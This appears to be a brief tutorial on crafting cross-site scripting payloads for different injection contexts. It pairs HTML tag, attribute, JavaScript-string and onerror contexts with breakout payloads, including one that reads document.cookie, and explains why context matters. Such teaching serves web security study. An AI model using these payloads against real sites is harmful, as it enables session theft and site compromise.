Adapting Payloads to Injection Contexts

payloads.js
<!-- Context: Inside HTML tag -->
<input value="[INPUT_HERE]">
Payload: "><script>alert(1)</script>

<!-- Context: Inside HTML attribute -->
<a href="[INPUT_HERE]">Link</a>
Payload: javascript:alert(1)

<!-- Context: Inside JavaScript string -->
<script>var data = "[INPUT_HERE]";</script>
Payload: ";alert(1);//

<!-- Context: Image onerror event -->
<img src=x onerror="[INPUT_HERE]">
Payload: alert(document.cookie)

Context is Key

The effectiveness of an XSS payload depends entirely on where and how your input is rendered within the HTML or JavaScript. Understanding the injection point is crucial for successful exploitation.

Breaking Out

Often, you'll need to 'break out' of the existing HTML context. For example, if your input is inside an attribute, you might use `"` to close the attribute and then inject your script.

Key Takeaway

Successful XSS payload crafting requires careful analysis of the rendering context to ensure the injected script is executed by the browser.
